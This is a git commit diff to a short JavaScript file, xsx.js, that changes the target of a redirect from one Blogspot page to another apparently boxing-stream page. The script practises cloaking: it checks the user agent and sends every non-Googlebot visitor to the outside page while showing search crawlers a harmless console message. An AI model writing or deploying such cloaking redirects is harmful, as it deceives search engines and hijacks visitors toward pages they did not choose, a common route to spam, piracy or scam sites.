393dfed317956cb2366784e2c7f48a692cf86b14
sportsworldtv <newnewkhota@gmail.com>
2026-07-26 05:30:32 +0600

    Update xsx.js

--- xsx.js
+++ xsx.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://viraldasi-video.blogspot.com/2026/07/x-global.html";
+  window.location.href = "https://4ktvlives.blogspot.com/2026/07/boxing.html";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
